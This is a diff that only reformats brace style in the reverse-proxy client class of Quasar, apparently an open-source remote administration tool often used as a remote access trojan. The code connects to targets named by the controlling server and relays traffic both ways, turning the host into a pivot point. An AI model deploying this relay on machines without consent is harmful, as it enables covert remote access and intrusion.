@@ -3,10 +3,8 @@ using System.Net;
 using System.Net.Sockets;
 using Quasar.Common.Messages;
 
-namespace Quasar.Client.ReverseProxy
-{
-    public class ReverseProxyClient
-    {
+namespace Quasar.Client.ReverseProxy {
+    public class ReverseProxyClient {
         public const int BUFFER_SIZE = 8192;
 
         public int ConnectionId { get; private set; }
@@ -17,8 +15,7 @@ namespace Quasar.Client.ReverseProxy
         private byte[] _buffer;
         private bool _disconnectIsSend;
 
-        public ReverseProxyClient(ReverseProxyConnect command, Networking.Client client)
-        {
+        public ReverseProxyClient(ReverseProxyConnect command, Networking.Client client) {
             this.ConnectionId = command.ConnectionId;
             this.Target = command.Target;
             this.Port = command.Port;
@@ -29,25 +26,17 @@ namespace Quasar.Client.ReverseProxy
             this.Handle.BeginConnect(command.Target, command.Port, Handle_Connect, null);
         }
 
-        private void Handle_Connect(IAsyncResult ar)
-        {
-            try
-            {
+        private void Handle_Connect(IAsyncResult ar) {
+            try {
                 this.Handle.EndConnect(ar);
-            }
-            catch { }
+            } catch { }
 
-            if (this.Handle.Connected)
-            {
-                try
-                {
+            if (this.Handle.Connected) {
+                try {
                     this._buffer = new byte[BUFFER_SIZE];
                     this.Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
-                }
-                catch
-                {
-                    Client.Send(new ReverseProxyConnectResponse
-                    {
+                } catch {
+                    Client.Send(new ReverseProxyConnectResponse {
                         ConnectionId = ConnectionId,
                         IsConnected = false,
                         LocalAddress = null,
@@ -58,19 +47,15 @@ namespace Quasar.Client.ReverseProxy
                 }
 
                 IPEndPoint localEndPoint = (IPEndPoint)this.Handle.LocalEndPoint;
-                Client.Send(new ReverseProxyConnectResponse
-                {
+                Client.Send(new ReverseProxyConnectResponse {
                     ConnectionId = ConnectionId,
                     IsConnected = true,
                     LocalAddress = localEndPoint.Address.GetAddressBytes(),
                     LocalPort = localEndPoint.Port,
                     HostName = Target
                 });
-            }
-            else
-            {
-                Client.Send(new ReverseProxyConnectResponse
-                {
+            } else {
+                Client.Send(new ReverseProxyConnectResponse {
                     ConnectionId = ConnectionId,
                     IsConnected = false,
                     LocalAddress = null,
@@ -80,66 +65,51 @@ namespace Quasar.Client.ReverseProxy
             }
         }
 
-        private void AsyncReceive(IAsyncResult ar)
-        {
+        private void AsyncReceive(IAsyncResult ar) {
             //Receive here data from e.g. a WebServer
 
-            try
-            {
+            try {
                 int received = Handle.EndReceive(ar);
 
-                if (received <= 0)
-                {
+                if (received <= 0) {
                     Disconnect();
                     return;
                 }
 
                 byte[] payload = new byte[received];
                 Array.Copy(_buffer, payload, received);
-                Client.Send(new ReverseProxyData {ConnectionId = ConnectionId, Data = payload});
-            }
-            catch
-            {
+                Client.Send(new ReverseProxyData { ConnectionId = ConnectionId, Data = payload });
+            } catch {
                 Disconnect();
                 return;
             }
 
-            try
-            {
+            try {
                 this.Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
-            }
-            catch
-            {
+            } catch {
                 Disconnect();
                 return;
             }
         }
 
-        public void Disconnect()
-        {
-            if (!_disconnectIsSend)
-            {
+        public void Disconnect() {
+            if (!_disconnectIsSend) {
                 _disconnectIsSend = true;
                 //send to the Server we've been disconnected
-                Client.Send(new ReverseProxyDisconnect {ConnectionId = ConnectionId});
+                Client.Send(new ReverseProxyDisconnect { ConnectionId = ConnectionId });
             }
 
-            try
-            {
+            try {
                 Handle.Close();
-            }
-            catch { }
+            } catch { }
 
             Client.RemoveProxyClient(this.ConnectionId);
         }
 
-        public void SendToTargetServer(byte[] data)
-        {
-            try
-            {
+        public void SendToTargetServer(byte[] data) {
+            try {
                 Handle.Send(data);
-            }
-            catch { Disconnect(); }
+            } catch { Disconnect(); }
         }
     }
 }
